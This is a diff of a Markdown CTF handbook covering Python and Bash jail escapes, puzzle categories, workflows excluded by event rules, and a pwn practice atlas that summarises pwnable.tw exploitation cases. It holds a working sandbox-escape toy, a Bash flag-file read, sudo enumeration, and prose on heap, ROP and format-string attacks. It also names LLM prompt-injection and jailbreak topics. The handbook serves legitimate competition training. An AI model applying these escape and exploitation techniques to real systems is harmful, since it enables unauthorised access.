-Use small diagnostic expressions, one at a time:
-
-```python
-1+1
-"A"*3
-().__class__
-(1).__class__.__name__
-```
-
-Expected results tell you whether arithmetic, strings, attribute access, and normal Python objects exist. A syntax error, filter rejection, NameError, and runtime exception reveal different stages. Do not assume `eval` accepts statements such as `x=1`; it does not. A walrus expression has separate syntax and scope restrictions.
-
-### A complete object-reference escape toy
-
-Removing `__builtins__` does not make references to powerful Python objects safe. Save as `jail_reference_toy.py`:
-
-```python
-FLAG = 'CTF{function_globals_are_reachable}'
-
-def helper():
-    return 'ordinary helper'
-
-def toy_jail(expression):
-    return eval(expression, {'__builtins__': {}, 'helper': helper}, {})
-
-assert toy_jail('1+1') == 2
-result = toy_jail("helper.__globals__['FLAG']")
-assert result == FLAG
-print(result)
-```
-
-For a real challenge, inspect which function/object is exposed and which globals it retains. If an exposed function's globals contain real builtins and the supplied flag path is `/app/flag.txt`, a corresponding builtins `open` call can read that file. The exact dictionary/module shape and filter rules decide the syntax.
-
-Subclass enumeration is another route, but hard-coded indexes are unreliable across versions and imported modules. Search by class name and verify its attributes in a local reproduction. Decorators, format-field traversal, `__getitem__`, and object lifecycle hooks can create implicit calls only if the jail permits the required syntax and objects.
-
-Unicode identifier normalization occurs during Python parsing; string literals are not normalized in the same way. Encoding comments matter only when source bytes are decoded as a file, not necessarily when an already-decoded input string is passed to `eval`.
-
-### Advanced jail constraints
-
-| Restriction | Useful starting point | Failure to avoid |
-|---|---|---|
-| No quotes | Existing docstrings, names, or indexed strings | Assuming the same docstring offsets across Python versions |
-| No direct calls | Allowed decorators, indexing, or formatting hooks | Mutating immutable built-in classes |
-| One dot | An already available attribute-access primitive | Presenting a chain containing many dots as a solution |
-| Prime length | Count actual transmitted characters; pad with a permitted comment | Confusing escaped source spelling with received bytes |
-| Length checked before a second read | Trace the second input's validation path | Treating assignment statements as valid `eval` expressions |
-| Audit hooks | Determine Python hook, native hook, and events actually monitored | Assuming private CPython memory offsets are portable |
-| Mastermind/distance oracle | Define exact score and input bounds | Interpreting a different score metric as character equality |
-
-Private-runtime memory corruption and hard-coded `_PyRuntime` offsets are not portable recipes. Keep those source examples as version-specific reverse-engineering leads, and validate in the supplied local binary before attempting anything against a service.
-
-## 10. Bash and restricted-shell puzzles
-
-Find the real shell and input path. A filter before `eval`, a restricted shell mode, a menu wrapper, and a seccomp sandbox impose different constraints. Test quoting and expansion locally with a harmless marker.
-
-```bash
-printf '%s\n' $'\103\124\106'
-printf '%s\n' "$0"
-```
-
-Expected first output: `CTF`. ANSI-C octal quoting creates bytes after the raw-input filter has already seen a different spelling. It helps only if the shell supports that syntax and the necessary characters survive the filter.
-
-For an assigned jail that permits the shell built-in `read` and redirection, a supplied flag path can be read without an external `cat`:
-
-```bash
-while IFS= read -r line; do printf '%s\n' "$line"; done < /app/flag.txt
-```
-
-This assumes that exact challenge file path and permissions. If redirection is filtered or execution happens in another shell, it fails. Closed stdout requires tracing the actual output channel; carriage returns can alter display but do not create file access by themselves.
-
-`HISTFILE`, startup files, environment variables, editor command hooks, and dynamic-loader variables are meaningful only if the wrapper invokes the corresponding feature. Do not set persistent startup variables on the competition workstation to test a challenge theory.
-
-## 11. Games, virtual machines, and finite-state puzzles
-
-Locate the authoritative state. Browser-rendered scores, local cookies, a WebSocket server, WASM memory, and server databases are different sources of truth. Change a harmless client value and check whether the server accepts the resulting state.
-
-For an unsigned or disclosed-secret Flask session, separate decoding from forging; a readable cookie is not necessarily modifiable. For WebSocket games, compare a normal frame with a controlled changed field. Server-time-only validation and floating-point edge cases require actual server acceptance, not just a changed display.
-
-WASM memory is linear bytes, but compiler layouts and exported functions determine meaningful offsets. Use supplied source and browser DevTools to correlate one known value before patching. Roblox files, PyInstaller bundles, remapped Python opcodes, and memfd-packed binaries belong primarily to reverse engineering; preserve their container/bytecode version and use the approved local tools from that chapter.
-
-### A shortest-path toy you can adapt
-
-Save as `maze_bfs.py`:
-
-```python
-from collections import deque
-
-grid = ['S..#', '.#..', '...E']
-start, goal = (0, 0), (2, 3)
-queue = deque([start])
-previous = {start: None}
-while queue:
-    r, c = queue.popleft()
-    if (r, c) == goal:
-        break
-    for dr, dc in [(1, 0), (-1, 0), (0, 1), (0, -1)]:
-        nr, nc = r+dr, c+dc
-        if not (0 <= nr < len(grid) and 0 <= nc < len(grid[0])):
-            continue
-        if grid[nr][nc] == '#' or (nr, nc) in previous:
-            continue
-        previous[(nr, nc)] = (r, c)
-        queue.append((nr, nc))
-assert goal in previous
-path = []
-current = goal
-while current is not None:
-    path.append(current)
-    current = previous[current]
-path.reverse()
-assert len(path)-1 == 5
-assert all(abs(a[0]-b[0])+abs(a[1]-b[1]) == 1 for a, b in zip(path, path[1:]))
-print(path)
-```
-
-For image mazes, first derive a stable grid from cell centers. Anti-aliased edges, moving sprites, and coordinate scaling can corrupt wall detection. If a move depends on inventory or switches, include them in the BFS state; position alone is insufficient.
-
-### Recurrences and number representation
-
-For a recurrence puzzle, compute a dozen terms locally, compare all supplied examples, then use dynamic programming or matrix exponentiation. Do not upload the challenge sequence to an online lookup service. OEIS-style automated online searching from the original source is excluded here.
-
-JavaScript integers lose exactness above `2^53-1`. **Kali only**, with listed Node.js:
-
-```javascript
-// Save as precision-demo.js; run: node precision-demo.js
-const x = 2 ** 53;
-console.log(x === x + 1); // true
-console.log(BigInt(x) === BigInt(x) + 1n); // false
-```
-
-A challenge must actually use floating-point number semantics for this to matter. JSON-to-integer conversion in another language may reject or preserve the value differently.
-
-De Bruijn sequences cover all fixed-length substrings efficiently, but cyclic versus linear output changes the required suffix. The 100-prisoners strategy follows permutation cycles; it does not guarantee success for an arbitrary instance. Fifteen-puzzle solvability depends on inversion parity and blank-row convention, so verify with a solved board before decoding bits.
-
-## 12. Constraint solving and esoteric languages
-
-Write constraints in the original domain. For bytes, constrain `0..255`; for fixed-width arithmetic, preserve wrapping and signedness. Add a second-solution check to learn whether the model is unique.
-
-Without an SMT dependency, small domains can be enumerated exactly. Save as `constraints_toy.py`:
-
-```python
-solutions = [(x, y) for x in range(10) for y in range(10)
-             if x+y == 11 and 3*x-y == 9]
-assert solutions == [(5, 6)]
-print(solutions[0])
-```
-
-For a provisioned `z3` library, model the same constraints first and verify its solution with ordinary Python. A SAT result is not a flag until it passes the challenge checker. YARA-derived conditions, Boolean circuits, nonograms, and type constraints may each need different domain choices.
-
-Brainfuck requires a tape size policy, cell width, EOF behavior, and matched bracket map. Instrument each opcode and bound the step count before running unknown code. Whitespace languages treat spaces, tabs, and newlines as syntax; do not strip them. Piet requires image color transitions and direction state; an image viewer alone does not execute it.
-
-Verilog/HDL puzzles require combinational versus sequential semantics, bit widths, signedness, and clock/reset behavior. If an unlisted simulator is required, manually translate a small circuit into a local Boolean model or use the provided approved environment; do not use an online HDL compiler.
-
-## 13. DNS and protocol puzzles
-
-Use the organizer-provided resolver or packet capture, not public infrastructure. DNS round-robin responses may reveal a set over repeated queries, but caching, TTL, and load balancing affect observations. A DNS maze needs a visited set and an explicit next-label rule.
-
-For DNSSEC NSEC walking, inspect predecessor/successor names and whether the zone uses NSEC or NSEC3. An IXFR request differs from AXFR and requires the proper serial framing. EDNS Client Subnet affects resolver behavior only when the server honors it; it is not a universal source-address spoof.
-
-When DNS carries encoded data, use transaction IDs, sequence fields, timestamps, and domain labels to reconstruct order. Remove the fixed suffix before decoding. Do not send challenge secrets through public DNS as a recovery method.
-
-DNS rebinding is a timing and resolution disagreement; capture both validation and fetch phases. A hostname resolving twice to the same address is a failed experiment, not proof that the application is safe.
-
-## 14. Challenge-scoped privilege puzzles
-
-These source topics apply only when the challenge explicitly gives you a shell or local service and makes privilege escalation part of the objective. Run checks inside that challenge, never on the competition workstation:
-
-```bash
-id
-pwd
-sudo -l
-```
-
-Read the exact allowed program and argument constraints. Wildcards can match path separators depending on the matching function; a symlink can change what a later privileged open sees. Confirm ownership and permissions of the specific file involved. Do not modify `/etc/sudoers` or host service configuration merely to prove a theory.
-
-SUID file readers, backup jobs, writable script paths, database program execution, print deployment services, and monitoring-agent arguments are separate primitives. Start with the supplied service's normal behavior and a harmless marker. The end goal is the designated challenge file, not persistence or workstation control.
-
-Docker socket, privileged containers, BuildKit secrets, Kubernetes tokens, NFS, and internal proxies require explicit inclusion in the challenge topology. A token found in a challenge does not authorize unrelated infrastructure. For a permitted local puzzle, determine the token's actual namespace/role or socket permissions before choosing an action.
-
-Historical polkit overflows, seccomp high-bit descriptor mistakes, editor escapes, and WinSSHTerm credential formats are version-specific. Use the supplied binary/configuration and approved reverse-engineering tools to verify the failing check. Source writeup commands are not portable proof.
-
-## 15. Portal workflow and a useful handoff
-
-Use the organizer's normal browser interface to read descriptions, download attachments, start instances, request hints, and submit flags. A CTFd-looking theme does not prove its API or authentication behavior. Hints can cost points; read the displayed consequence before purchasing.
-
-If the organizer explicitly documents an API for competitors, use its token and endpoint format as supplied. Keep the token out of notes and logs. Do not scrape hidden challenges, attack the scoring platform, or automate repeated submissions because an old repository script can do so.
-
-Record each solve as input artifact/hash, interpretation, exact transformation or script, expected output, final flag, and remaining assumptions. If a QR, audio, game, or jail solution depends on manual transcription, save that intermediate representation so a teammate can reproduce it.
-
-The 14 source files in `ctf-misc/` are merged here: overview; encodings and advanced formats; audio and RF; Python/Bash jails; games/VMs parts 1–4; DNS; CTFd navigation; and Linux privilege puzzles. Overlapping network, media, crypto, and reverse-engineering details are cross-category material rather than new official event categories.
-
-
----
-
-<a id="12-excluded-and-advanced"></a>
-
-# Excluded workflows and advanced material
-
-The repository contains agent instructions and techniques that are unsuitable for this event handbook. The approved workbook and [official event rules](https://ajccbc.ncsa.or.th/cyber-sea-game-2026/) control tool use. A source file remaining in the repository is not approval to run it.
-
-## AI/ML and agent workflows are excluded
-
-All four files in `ctf-ai-ml/` are excluded from runnable event instructions:
-
-| Source | Material reviewed | Reason and useful manual alternative |
-|---|---|---|
-| `SKILL.md` | Model inspection, weight comparison, adversarial tests, remote LLM calls | AI/ML tools and libraries are not permitted. Identify ordinary file/container metadata with approved local tools; route conventional data/crypto logic to the relevant chapter |
-| `adversarial-ml.md` | FGSM, PGD, C&W, adversarial patches, poisoning, backdoor analysis, historical Keras/foolbox examples | These depend on prohibited ML frameworks/workflows. Do not install or run them; inspect an ordinary supplied parser or validation function manually if that is the actual challenge surface |
-| `model-attacks.md` | Weight negation, inversion, encoder collisions, LoRA merging, model extraction, membership inference | Model training/inference and related tools are excluded. For a non-AI artifact embedded in an archive, inspect the archive structure and recover that artifact without loading a model |
-| `llm-attacks.md` | Prompt injection, jailbreaks, token smuggling, context manipulation, agent tool misuse | AI interaction workflows are excluded. Treat embedded text as data; analyze any conventional HTTP/authentication/serialization issue manually |
-
-The web sources also contain chatbot and AI tool-call sections. Those sections are excluded even though the rest of their source files is adapted. There are no runnable prompts, framework installers, model downloads, or AI service calls in this handbook.
-
-## Tavily, MCP, and automated online assistance are excluded
-
-`ctf-similar-search/SKILL.md`, `search.py`, and `search.sh` implement Tavily-based search/extraction. The Python client requests an answer from the service and transmits search queries/URLs. These are not the manual local research workflow used here.
-
-`ctf-web/tools-mcp.md` describes Playwright/Burp MCP integrations, agent approval settings, scanners, and callback services. Use the approved browser DevTools and Burp Community interface manually as shown in [Web exploitation](#02-web-exploitation). Burp Community does not imply approval of every extension or Professional-only feature.
-
-For **Kali**, use supplied offline references without exposing challenge material:
-
-```bash
-rg -n -i 'padding oracle|nonce reuse' /opt/tools/hacktricks
-rg -n -i 'sudo|wildcard' /opt/tools/GTFOBins.github.io
-```
-
-Search for the general technique locally, read the matching explanation, and compare prerequisites to the supplied challenge. If the path is absent, use the handbook and supplied source; do not assume an unlisted reference checkout can be installed.
-
-## Tools and services that are not substitutes
-
-| Source suggestion | Event-compliant replacement |
-|---|---|
-| Public webhook, callback tunnel, cloud function, external JWKS host | Organizer-provided callback service or a same-challenge observable response; otherwise keep a blind hypothesis unconfirmed |
-| Online hash cracking, public FactorDB lookup, online mathematical solver | Local Python arithmetic, listed local factoring/cracking tools, or an honest environment limitation |
-| Online compiler/decompiler | Approved local compiler/decompiler, supplied build artifact, or manual static analysis |
-| Dirsearch | A few evidence-backed paths in Repeater; targeted low-rate ffuf on Kali when appropriate |
-| JWT Editor, GraphQL Raider, Hackvertor, Copy As Python-Requests | Raw HTTP editing and local standard-library decoding; these extensions are explicitly unapproved |
-| YAFU | Local mathematical checks or an appropriate approved crypto-attacks implementation on Kali |
-| MMSSTV/RX-SSTV | Inspect the available approved audio workflow; verify what the listed SSTV package actually supports |
-| Large asynchronous fuzzing script | Manual baseline/control experiment and a small bounded candidate set |
-| Online sequence lookup/OEIS automation | Derive a recurrence from supplied terms and validate it locally |
-
-The workbook's permission to add non-AI Python libraries appears in the Windows sheet. It is not a loophole for explicitly unapproved tools, and it is not a claim that every library is already installed or that the same installation policy was stated for Kali.
-
-## Advanced does not mean excluded
-
-Useful advanced topics remain in the handbook with their prerequisites:
-
-- [Web exploitation](#02-web-exploitation): parser disagreement, browser origins, cache/race/protocol behavior, serialization, source-based framework analysis, and static Web3 review.
-- [Cryptography](#07-cryptography): exact integer arithmetic, practical RSA and oracle demonstrations, nonces, modes, and PRNG modelling.
-- [Advanced cryptography](#14-advanced-crypto): lattices, ECC, small roots, unusual algebra, proof systems, post-quantum recognition, and reduced-round constructions.
-- [Miscellaneous](#11-miscellaneous): constrained interpreters, finite-state games, encoding reconstruction, RF/audio prerequisites, and explicitly challenge-scoped privilege puzzles.
-
-Version-specific exploits need the supplied version and configuration. The handbook does not present every historical payload as current. In particular, Python `eval` cannot accept assignment statements; private runtime memory offsets are not portable; prototype pollution needs a merge and a gadget; FROST is not inherently a lattice scheme; and a listed package name does not guarantee a particular decoder executable.
-
-The original high-concurrency fuzzer has further correctness limits: regex markers are not stripped consistently, processing-chain arguments do not uniformly match the callable signatures, redirects can hide the first response, and TLS verification is disabled in paths where it should remain enabled. It is retained as source provenance, not endorsed as a runnable event tool.
-
-## What to do when a challenge seems to require an excluded tool
-
-Continue the parts that use approved local tools: inspect bytes, source, equations, normal requests, and supplied metadata. Identify the specific missing capability. Ask the organizer for clarification through the event's normal support channel before using a prohibited or unlisted tool. Do not upload the challenge, install an AI framework, or invoke an online service to bypass the restriction.
-
-File-by-file dispositions are recorded in `human-guide/review/web-coverage.json`. An “adapted” or “merged” file may contain excluded subsections; its notes identify those exceptions. “Reference-only” means historical/provenance material whose original commands are not part of the runnable handbook.
-
-
----
-
 <a id="13-pwn-practice-atlas"></a>
 
+<a id="13-pwn-practice-atlas--pwn-practice-atlas-43-cases-each-with-a-specific-lesson"></a>
+
 # Pwn practice atlas: 43 cases, each with a specific lesson
+
+**Quick route:** [Short commands](#quickstart--crash-offset) · [Tool strengths and weaknesses](#tool-chooser--binary-exploitation). Use this chapter for deeper explanations.
 
 Use this atlas after the binary-exploitation chapter. It preserves the individual exercises from `ctf-pwn/pwnable-tw/` without presenting historical offsets as universal exploits. The cases are preparation material, not an instruction to connect to public practice servers during the competition. Use locally supplied practice artifacts or an explicitly assigned challenge service.
 
 The case descriptions below come from the repository's individual writeups. Their original binaries, exact runtimes, and exploit success claims were not reproduced for this handbook. Several directory-index summaries disagree with their detailed writeups; the disputed claims are identified below. Treat the individual mechanisms as hypotheses to verify against your copy of the binary.
+
+<a id="13-pwn-practice-atlas--how-to-work-through-a-case"></a>
 
 ## How to work through a case
 
@@ -5184,9 +6293,13 @@ r2 chall
 
 In radare2, use `aaa`, `afl`, `pdf @ main`, and `axt @ IMPORT`, replacing `IMPORT` with the exact flag shown by `ii`. Follow the vulnerable caller, identify the input operation and the state it changes, then inspect the next consumer of that state. The GDB commands in the pwn chapter are the **Windows WSL** debugging route; Kali debugging requires the supplied GDB environment to work. **Windows native** x64dbg is for Windows PE targets, not these Linux ELF cases.
 
-For stdlib packing use Windows WSL Python, or Kali Python after checking its availability. Pwntools is not individually listed as preinstalled. The Windows non-AI-library permission does not establish its availability in either environment. Keep original template scripts as study references; the pwn chapter describes their defects and standard-library alternatives.
+For stdlib packing use Windows WSL Python, or Kali Python after checking its availability. Pwntools is not individually listed as preinstalled. PDF p.5 permits non-AI libraries in either environment; permission does not establish availability or satisfy native-tool dependencies. Keep original template scripts as study references; the pwn chapter describes their defects and standard-library alternatives.
+
+<a id="13-pwn-practice-atlas--first-control-flow-and-parsing-exercises"></a>
 
 ## First control-flow and parsing exercises
+
+<a id="13-pwn-practice-atlas--1-start-obtain-the-stack-address-before-using-it"></a>
 
 ### 1. `start`: obtain the stack address before using it
 
@@ -5196,6 +6309,8 @@ The detailed writeup describes a 60-byte read into a 20-byte message region, fol
 
 **Checkpoint:** the recovered pointer falls inside the current stack mapping and the next read lands where you predict. A successful first write does not mean the second payload has enough space. Source: `ctf-pwn/pwnable-tw/start.md`.
 
+<a id="13-pwn-practice-atlas--2-orw-the-permitted-end-goal-is-smaller-than-a-shell"></a>
+
 ### 2. `orw`: the permitted end goal is smaller than a shell
 
 **Prerequisites:** i386 Linux syscalls, shellcode placement, seccomp policy interpretation.
@@ -5203,6 +6318,8 @@ The detailed writeup describes a 60-byte read into a 20-byte message region, fol
 Input is executed in a writable/executable region, but a syscall filter limits what it can do. Decode the actual policy and implement the permitted file-read sequence: open the exact challenge path, preserve the returned descriptor, read into a valid buffer, and write the returned count. The historical alternative involving a missing architecture check requires a very specific kernel and filter; do not confuse x32 ABI calls with a 32-to-64-bit mode switch.
 
 **Checkpoint:** every syscall and argument is permitted, and errors are distinguished from successful reads. Source: `ctf-pwn/pwnable-tw/orw.md`.
+
+<a id="13-pwn-practice-atlas--3-calc-an-arithmetic-parser-can-become-a-stack-index-primitive"></a>
 
 ### 3. `calc`: an arithmetic parser can become a stack-index primitive
 
@@ -5212,6 +6329,8 @@ The source describes a mismatch between pushing an operand and evaluating an ope
 
 **Checkpoint:** one selected word changes by the predicted delta while surrounding state remains usable. Preserve any canary and account for arithmetic width. Source: `ctf-pwn/pwnable-tw/calc.md`.
 
+<a id="13-pwn-practice-atlas--4-silver_bullet-the-terminator-changes-the-next-operations-length"></a>
+
 ### 4. `silver_bullet`: the terminator changes the next operation's length
 
 **Prerequisites:** struct layout, `strncat` semantics, staged ret2libc on i386.
@@ -5219,6 +6338,8 @@ The source describes a mismatch between pushing an operand and evaluating an ope
 When the description reaches its nominal capacity, the appended NUL reaches the adjacent power field. The next append trusts that altered field and can write farther. Measure the field boundary and demonstrate the reset with a complete-length input before using the enlarged append to reach saved control data.
 
 **Checkpoint:** the first operation changes length state, and the second demonstrably uses that new state. Leak and reentry stages must each preserve the game's expected flow. Source: `ctf-pwn/pwnable-tw/silver_bullet.md`.
+
+<a id="13-pwn-practice-atlas--5-dubblesort-the-program-rearranges-the-payload"></a>
 
 ### 5. `dubblesort`: the program rearranges the payload
 
@@ -5228,6 +6349,8 @@ An unterminated name can disclose neighboring stack data; an excessive element c
 
 **Checkpoint:** model the sorted array locally and confirm the canary and final control words end up at the intended slots. A “skip input” trick is insufficient if sorting later moves the preserved word. Source: `ctf-pwn/pwnable-tw/dubblesort.md`.
 
+<a id="13-pwn-practice-atlas--6-3x17-a-small-write-becomes-a-staged-sequence"></a>
+
 ### 6. `3x17`: a small write becomes a staged sequence
 
 **Prerequisites:** ELF destructors, static x86-64 layout, `leave; ret` stack pivots.
@@ -5235,6 +6358,8 @@ An unterminated name can disclose neighboring stack data; an excessive element c
 The source describes a fixed-size arbitrary write and writable destructor-related state. Reentering the input routine through the finalization path can provide repeated writes, after which a prepared fake frame pivots to a chain. Confirm the actual finalizer order and guard counter: “infinite writes” in the source is shorthand and may be bounded by program state.
 
 **Checkpoint:** two consecutive writes succeed through the planned reentry, and the fake frame has both a replacement BP word and a return word. Source: `ctf-pwn/pwnable-tw/3x17.md`.
+
+<a id="13-pwn-practice-atlas--7-starbound-a-menu-choice-becomes-an-indirect-call"></a>
 
 ### 7. `starbound`: a menu choice becomes an indirect call
 
@@ -5244,6 +6369,8 @@ The main menu uses the parsed choice as an unchecked index into a function table
 
 **Checkpoint:** the dispatcher reads the intended pointer from your name data. Then prove the chosen gadget's stack and register effects before using it for a leak or pivot. Source: `ctf-pwn/pwnable-tw/starbound.md`.
 
+<a id="13-pwn-practice-atlas--8-babystack-an-authentication-oracle-and-stale-stack-bytes-compose"></a>
+
 ### 8. `babystack`: an authentication oracle and stale stack bytes compose
 
 **Prerequisites:** prefix comparisons, NUL termination, repeated stateful requests, stack-copy behavior.
@@ -5252,7 +6379,11 @@ The comparison length comes from the supplied string, so empty input or a correc
 
 **Checkpoint:** a known correct and known wrong prefix produce distinct results under the same process state. Then demonstrate the stale tail used by the copy. Source: `ctf-pwn/pwnable-tw/babystack.md`.
 
+<a id="13-pwn-practice-atlas--constrained-code-and-missing-output-exercises"></a>
+
 ## Constrained code and missing-output exercises
+
+<a id="13-pwn-practice-atlas--9-death_note-a-negative-index-reaches-a-relocation-slot"></a>
 
 ### 9. `death_note`: a negative index reaches a relocation slot
 
@@ -5262,6 +6393,8 @@ The note index is checked only against an upper bound. Derive which negative slo
 
 **Checkpoint:** the target slot changes to the allocated buffer and the next call actually dereferences it. Check every input byte against the filter before attempting execution. Source: `ctf-pwn/pwnable-tw/death_note.md`.
 
+<a id="13-pwn-practice-atlas--10-alive_note-tiny-fragments-need-a-reliable-bridge"></a>
+
 ### 10. `alive_note`: tiny fragments need a reliable bridge
 
 **Prerequisites:** the negative-index primitive, alphanumeric encoding, heap placement, short jumps.
@@ -5269,6 +6402,8 @@ The note index is checked only against an upper bound. Derive which negative slo
 This variant combines a small per-note limit with a restricted character set. The source chains tiny code fragments across allocations, but allocator padding and terminators are part of the instruction stream. First draw fragment addresses, usable bytes, and gaps; then derive each jump and verify the initial register state used by the decoder.
 
 **Checkpoint:** a local disassembly follows the intended fragment sequence without executing chunk headers or NUL terminators. Source: `ctf-pwn/pwnable-tw/alive_note.md`.
+
+<a id="13-pwn-practice-atlas--11-mno2-bytes-must-satisfy-two-grammars"></a>
 
 ### 11. `mno2`: bytes must satisfy two grammars
 
@@ -5278,6 +6413,8 @@ The executed input must also parse as a chemical formula. A sequence that is val
 
 **Checkpoint:** the full first stage passes the original validator and reconstructs the intended unrestricted bytes in writable memory. Element-looking bytes are not harmless padding if they change a needed register. Source: `ctf-pwn/pwnable-tw/mno2.md`.
 
+<a id="13-pwn-practice-atlas--12-kidding-account-for-descriptors-closed-before-control-transfer"></a>
+
 ### 12. `kidding`: account for descriptors closed before control transfer
 
 **Prerequisites:** static i386 ROP, descriptor lifetime, tight payload budgets.
@@ -5285,6 +6422,8 @@ The executed input must also parse as a chemical formula. A sequence that is val
 The binary reads once, then closes standard input/output/error before returning. The obvious second read or stdout write is therefore unavailable. Trace the descriptor closures and count the first payload's usable bytes; any restored communication must stay within an explicitly authorized local practice topology.
 
 **Checkpoint:** the complete first-stage path works with descriptors 0, 1 and 2 already closed. The historical helper/flag path is specific to that challenge image. No public callback endpoint or listener is provided by this handbook. Source: `ctf-pwn/pwnable-tw/kidding.md`.
+
+<a id="13-pwn-practice-atlas--13-unexploitable-manufacture-a-missing-primitive-from-existing-code"></a>
 
 ### 13. `unexploitable`: manufacture a missing primitive from existing code
 
@@ -5294,6 +6433,8 @@ The overflow is simple, but the binary lacks an ordinary output routine and conv
 
 **Checkpoint:** the redirected call reaches the intended instruction and its registers have the expected values. A read returning 15 is usable for SROP only if the trigger and frame are also correct. Source: `ctf-pwn/pwnable-tw/unexploitable.md`.
 
+<a id="13-pwn-practice-atlas--14-de_aslr-use-a-pointer-already-present-without-printing-it"></a>
+
 ### 14. `de_aslr`: use a pointer already present without printing it
 
 **Prerequisites:** constrained x86-64 ROP, stack pivots, arithmetic gadgets, dynamic linker internals.
@@ -5301,6 +6442,8 @@ The overflow is simple, but the binary lacks an ordinary output routine and conv
 The detailed writeup describes an unbounded `gets`, no normal output function, and Full RELRO. Study how a known libc pointer can be loaded or transformed through existing register/memory operations without first leaking it. The directory index's generic writable-GOT/dynamic-resolver story is not sufficient evidence for this target.
 
 **Checkpoint:** track one existing pointer through every gadget and prove the resulting indirect target. Test newline restrictions and carry/overflow side effects. Source: `ctf-pwn/pwnable-tw/de_aslr.md`.
+
+<a id="13-pwn-practice-atlas--15-printable-a-format-string-can-still-act-when-output-is-closed"></a>
 
 ### 15. `printable`: a format string can still act when output is closed
 
@@ -5310,7 +6453,11 @@ The format sink executes after stdout is closed, and the program then calls `exi
 
 **Checkpoint:** distinguish a successful loop, a restored output channel, and final control flow as three separate milestones. Historical argument positions and retry probabilities depend on the original runtime. Source: `ctf-pwn/pwnable-tw/printable.md`.
 
+<a id="13-pwn-practice-atlas--heap-ownership-and-allocator-exercises"></a>
+
 ## Heap ownership and allocator exercises
+
+<a id="13-pwn-practice-atlas--16-hacknote-metadata-can-be-reclaimed-as-content"></a>
 
 ### 16. `hacknote`: metadata can be reclaimed as content
 
@@ -5320,6 +6467,8 @@ Deleting a note frees its metadata and content but leaves the table pointer. A l
 
 **Checkpoint:** a new buffer overlaps the stale note object, and the print action reads the expected callback and argument. Start with a controlled disclosure before a final call. Source: `ctf-pwn/pwnable-tw/hacknote.md`.
 
+<a id="13-pwn-practice-atlas--17-secret_garden-free-state-and-table-membership-disagree"></a>
+
 ### 17. `secret_garden`: free state and table membership disagree
 
 **Prerequisites:** glibc fastbins/unsorted bins, stale references, partial writes.
@@ -5327,6 +6476,8 @@ Deleting a note frees its metadata and content but leaves the table pointer. A l
 Removing a flower releases its name but leaves enough object state to revisit the allocation. The source combines disclosure of freed metadata with repeated frees/reallocation. Distinguish a slot's active flag from whether its pointer has been cleared; cleanup operations can change the heap history.
 
 **Checkpoint:** after removal, identify exactly which later action still accesses the freed name and what bytes an allocation preserves. Source: `ctf-pwn/pwnable-tw/secret_garden.md`.
+
+<a id="13-pwn-practice-atlas--18-secret_of_my_heart-one-nul-changes-consolidation"></a>
 
 ### 18. `secret_of_my_heart`: one NUL changes consolidation
 
@@ -5336,6 +6487,8 @@ A full content read is followed by a terminator one byte beyond the requested bu
 
 **Checkpoint:** freeing the affected neighbor produces the intended overlap without an integrity abort. A time-derived metadata address or hidden menu route is an alternative to investigate, not a required assumption. Source: `ctf-pwn/pwnable-tw/secret_of_my_heart.md`.
 
+<a id="13-pwn-practice-atlas--19-tcache_tear-repeated-free-plus-a-fixed-scratch-region"></a>
+
 ### 19. `tcache_tear`: repeated free plus a fixed scratch region
 
 **Prerequisites:** the supplied early-tcache libc, free-list state, fake-chunk prerequisites, unsorted disclosures.
@@ -5343,6 +6496,8 @@ A full content read is followed by a terminator one byte beyond the requested bu
 The detailed source's reliable core is a global pointer left live after free, plus a known BSS region useful for shaping metadata. Prove the actual tcache behavior of the supplied build and the allocation sequence leading to the target region. Do not transplant this chain to modern safe-linking allocators.
 
 **Checkpoint:** repeated allocation returns the intended overlap, and a forged larger chunk satisfies the target allocator's checks. The source's additional claim that a small `malloc(size)` plus `read(..., size)` is itself an overflow is not established by that code and is not used here. Source: `ctf-pwn/pwnable-tw/tcache_tear.md`.
+
+<a id="13-pwn-practice-atlas--20-heap_paradise-build-a-leak-before-relying-on-absolute-addresses"></a>
 
 ### 20. `heap_paradise`: build a leak before relying on absolute addresses
 
@@ -5352,6 +6507,8 @@ The menu has allocation/free operations and stale pointers but no convenient nor
 
 **Checkpoint:** a recognizable libc pointer is emitted and confirmed against the supplied library. Record the unknown low bits and measured retry rate instead of calling the initial partial overwrite deterministic. Source: `ctf-pwn/pwnable-tw/heap_paradise.md`.
 
+<a id="13-pwn-practice-atlas--21-bookwriter-no-delete-operation-does-not-mean-no-freed-chunk"></a>
+
 ### 21. `bookwriter`: no delete operation does not mean no freed chunk
 
 **Prerequisites:** unterminated strings, top-chunk behavior, historical House of Orange/FILE exploitation.
@@ -5359,6 +6516,8 @@ The menu has allocation/free operations and stale pointers but no convenient nor
 The editor updates capacity from `strlen`, which can exceed the original allocation when no NUL is present. The source combines this with top-chunk manipulation to enter allocator paths that free old top memory without a menu delete. Also inspect the off-by-one page slot and author-string disclosure.
 
 **Checkpoint:** the edited length really increases, the next write reaches the intended metadata, and the old top follows the predicted allocator path. The final FILE technique requires the old challenge libc. Source: `ctf-pwn/pwnable-tw/bookwriter.md`.
+
+<a id="13-pwn-practice-atlas--22-applestore-a-list-keeps-a-pointer-to-an-expired-stack-object"></a>
 
 ### 22. `applestore`: a list keeps a pointer to an expired stack object
 
@@ -5368,6 +6527,8 @@ A specific cart total creates a promotional node as a local variable and links i
 
 **Checkpoint:** listing the cart dereferences your chosen name pointer. Before using unlink, calculate both writes and ensure the secondary write does not crash or destroy a needed field. Source: `ctf-pwn/pwnable-tw/applestore.md`.
 
+<a id="13-pwn-practice-atlas--23-spirited_away-decimal-formatting-changes-a-length-field-at-a-threshold"></a>
+
 ### 23. `spirited_away`: decimal formatting changes a length field at a threshold
 
 **Prerequisites:** precise stack layout, decimal string lengths, fake-chunk allocation.
@@ -5375,6 +6536,8 @@ A specific cart total creates a promotional node as a local variable and links i
 The feedback counter is formatted into a buffer near a length field. As the digit count grows, the formatted suffix corrupts that field and enables a larger later read. An unterminated reason supplies useful disclosures; the historical chain then places a fake chunk on the stack.
 
 **Checkpoint:** observe the exact counter threshold and changed length byte. Verify the fake chunk and next allocation before targeting a saved return slot. Source: `ctf-pwn/pwnable-tw/spirited_away.md`.
+
+<a id="13-pwn-practice-atlas--24-re_alloc-audit-the-zero-size-return-path-carefully"></a>
 
 ### 24. `re_alloc`: audit the zero-size return path carefully
 
@@ -5384,6 +6547,8 @@ The intended lesson is a stale-pointer/lifetime error around zero-size reallocat
 
